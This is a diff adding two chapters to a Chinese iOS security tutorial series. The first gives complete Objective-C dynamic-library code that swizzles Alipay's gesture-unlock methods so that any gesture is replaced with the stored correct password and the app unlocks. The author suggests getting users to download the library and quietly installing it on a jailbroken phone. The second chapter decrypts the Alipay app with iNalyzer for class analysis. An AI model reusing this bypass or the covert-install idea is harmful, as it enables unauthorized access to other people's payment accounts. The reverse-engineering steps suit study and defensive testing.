@@ -21,6 +21,10 @@
 * [iOS安全攻防（十一）：Hack实战——探究支付宝app手势密码](#markdown-af11) 
 * [iOS安全攻防（十二）：iOS7的动态库注入](#markdown-af12) 
 * [iOS安全攻防（十三）：数据擦除](#markdown-af13) 
+* [iOS安全攻防（十四）：Hack实战——支付宝app手势密码校验欺骗](#markdown-af14) 
+* [iOS安全攻防（十五）：使用iNalyzer分析应用程序](#markdown-af15) 
+
+
 
 ### <a name="markdown-af01"></a>iOS安全攻防（一）：Hack必备的命令与工具
 
@@ -1363,4 +1367,206 @@ Log输出如下：
 编译器把两个information的省略到一个地址了～
 
 
+### <a name="markdown-af14"></a>iOS安全攻防（十四）：Hack实战——支付宝app手势密码校验欺骗
 
+
+在 iOS安全攻防（十一）：Hack实战——探究支付宝app手势密码 中，介绍了如何利用gdb分析app，确定了支付宝app的手势密码格式为字符串，9个点分别对应123456789。在 iOS安全攻防（十二）：iOS7的动态库注入 中，介绍了如果利用越狱大神们为我们开辟的iOS7动态库注入方法。
+ 
+本文将继续深入hack实战，hook支付宝手势密码校验操作，欺骗其通过任意手势输入。
+ 
+那么到现在为止，我们已经掌握了什么信息呢？
+1）一个名叫 GestureUnlockViewController 的类，含有 gestureInputView:didFinishWithPassword: 方法，来处理输入的手势
+2）正确的手势密码通过一个名叫 GestureUtil 的类读取，方法是 getPassword 
+ 
+思路马上清晰了，我们需要做2步：
+1）hook getPassword 存下正确的密码
+2）hook gestureInputView:didFinishWithPassword:  替换当前输入为正确的密码
+ 
+一个关键点，我们是用 Method Swizzling来hook，那么就意味操作不能过早，因为我们要保证在取到 GestureUnlockViewController 和 GestureUtil class后，才能进行imp替换。
+所以， 我采用NSNotificationCenter通知机制协助完成任务。
+
+    #import <objc/runtime.h>   
+    #import <UIKit/UIKit.h>   
+       
+    IMP ori_getPasswd_IMP = NULL;   
+    IMP ori_gesture_IMP = NULL;   
+       
+    @interface NSObject (HackPortal)   
+       
+    @end   
+       
+    @implementation NSObject (HackPortal)   
+       
+    + (id)getPassword   
+    {   
+        NSString *passwd = ori_getPasswd_IMP(self, @selector(getPassword));   
+        return passwd;   
+    }   
+       
+    - (void)gestureInputView:(id)view didFinishWithPassword:(id)password   
+    {   
+        password = ori_getPasswd_IMP(self, @selector(getPassword));   
+        ori_gesture_IMP(self, @selector(gestureInputView:didFinishWithPassword:), view, password);   
+    }   
+       
+    @end   
+       
+    @implementation PortalListener   
+       
+    - (id)init   
+    {   
+        self = [super init];   
+        if (self) {   
+            [[NSNotificationCenter defaultCenter]addObserver:self   
+                                                    selector:@selector(appLaunched:)   
+                                                        name:UIApplicationDidBecomeActiveNotification   
+                                                      object:nil];   
+        }   
+        return self;   
+    }   
+       
+    - (void)appLaunched:(NSNotification *)notification   
+    {   
+        Class class_GestureUtil = NSClassFromString(@"GestureUtil");   
+        Class class_PortalListener = NSClassFromString(@"PortalListener");   
+        Method ori_Method = class_getClassMethod(class_GestureUtil, @selector(getPassword));   
+        ori_getPasswd_IMP = method_getImplementation(ori_Method);   
+        Method my_Method = class_getClassMethod(class_PortalListener, @selector(getPassword));   
+        method_exchangeImplementations(ori_Method, my_Method);   
+           
+        Class class_Gesture = NSClassFromString(@"GestureUnlockViewController");   
+        Method ori_Method1 = class_getInstanceMethod(class_Gesture,   
+                                                     @selector(gestureInputView:didFinishWithPassword:));   
+        ori_gesture_IMP = method_getImplementation(ori_Method1);   
+        Method my_Method1 = class_getInstanceMethod(class_PortalListener,   
+                                                    @selector(gestureInputView:didFinishWithPassword:));   
+        method_exchangeImplementations(ori_Method1, my_Method1);   
+    }   
+       
+    -(void)dealloc   
+    {   
+        [[NSNotificationCenter defaultCenter]removeObserver:self];   
+    }   
+       
+    @end   
+       
+    static void __attribute__((constructor)) initialize(void)   
+    {   
+        static PortalListener *entrance;   
+        entrance = [[PortalListener alloc]init];   
+    }   
+
+OK！编译好动态库，塞进iPhone试试效果吧～
+ 
+不管我们输入什么手势，都会被替换为正确的密码去给gestureInputView:didFinishWithPassword:验证，然后顺利解锁。
+ 
+这意味着什么呢？
+ 
+意味着，我们可以通过正规的渠道让用户下载这个动态库，然后悄悄放进越狱的iPhone的/Library/MobileSubstrate/DynamicLibraries/目录下……然后……然后去给妹纸帅锅变魔术吧：“你看，我和你多心有灵犀，你改什么密码我都猜的到！”
+
+
+
+### <a name="markdown-af15"></a>iOS安全攻防（十五）：使用iNalyzer分析应用程序
+
+
+
+好想用 doxygen 画iOS app的class继承关系。
+
+有没有比 class-dump-z 更直观的分析工具？
+
+利器 iNalyzer 隆重登场～
+
+ 
+
+一、iNalyzer的安装
+
+在iPhone端：
+
+1）进入cydia添加源 http://appsec-labs.com/cydia/
+
+2）搜索 iNalyzer 并安装
+
+ 
+
+二、Doxygen和Graphviz的安装
+
+在Mac端：
+
+brew install doxygen graphviz
+
+ 
+
+三、解密支付宝app
+
+1）查看可解密的app
+
+    cd /Applications/iNalyzer5.app   
+    ./iNalyzer5    
+       
+    usage: ./iNalyzer5 [application name] [...]   
+    Applications available: Portal Tenpay    
+
+ 
+
+2）解密支付宝app
+
+    ./iNalyzer5 Portal   
+       
+    got params /var/mobile/Applications/4763A8A5-2E1D-4DC2-8376-6CB7A8B98728/Portal.app/ Portal.app 800 iNalyzer is iNalyzing Portal...   
+    iNalyzer:crack_binary got /var/mobile/Applications/4763A8A5-2E1D-4DC2-8376-6CB7A8B98728/Portal.app/Portal /tmp/iNalyzer5_3f0d8773/Payload/Portal.app/Portal Dumping binary...helloooo polis?   
+    helloooo polis?   
+    iNalyzer:Creating SnapShot into ClientFiles   
+    iNalyzer:SnapShot Done   
+    iNalyzer:Population Done   
+    iNalyzer:Dumping Headers   
+    iNalyzer:Patching Headers   
+    /bin/sh: /bin/ls: Argument list too long   
+    ls: cannot access *_fixed: No such file or directory   
+        /var/root/Documents/iNalyzer/支付宝钱包-v8.0.0.ipa   
+
+将解密后的ipa拷贝到本地
+
+ 
+
+四、修改doxMe.sh脚本
+
+解压ipa, cd 到 /支付宝钱包-v8.0.0/Payload/Doxygen 下找到 doxMe.sh
+
+    #!/bin/sh   
+       
+    /Applications/Doxygen.app/Contents/Resources/doxygen dox.template && open ./html/index.html   
+
+ 
+
+我们是通过brew安装的 doxygen，所以修改脚本为：
+
+    #!/bin/sh   
+       
+    doxygen dox.template && open ./html/index.html   
+
+ 
+
+五、执行doxMe.sh脚本
+
+    ./doxMe.sh    
+
+完成后浏览器会自动 open 生成的html文件
+
+ 
+
+六、查看信息
+
+通过index.html我们可以直观的查看到 Strings analysis ， ViewControllers，Classes 等几大类的信息。
+
+
+![](./images/231.png)
+
+
+在Classes->Class Hierarchy 可以查看到类继承图示。
+
+ 
+
+支付宝app class Hierarchy 结果冰山一角：
+
+
+![](./images/232.png)
